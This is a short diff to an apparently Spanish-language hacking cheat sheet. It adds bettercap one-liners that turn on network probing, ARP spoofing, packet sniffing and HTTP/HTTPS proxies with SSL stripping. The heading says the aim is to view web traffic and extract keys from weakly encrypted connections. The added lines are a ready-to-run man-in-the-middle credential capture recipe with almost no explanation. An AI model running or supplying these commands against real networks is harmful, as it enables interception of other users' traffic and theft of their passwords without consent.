@@ -42,5 +42,13 @@ Ver trafico web por proxy y extrae claves:
 
 net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on; set http.proxy.sslstrip true
 
+Ver trafico web por proxy y extrae claves de cifrados debiles:
+
+net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on; set http.proxy.sslstrip true
+
+set http.proxy.port 80
+set https.proxy.port 443
+http.proxy on
+https.proxy on
 
 www.hackingyseguridad.com
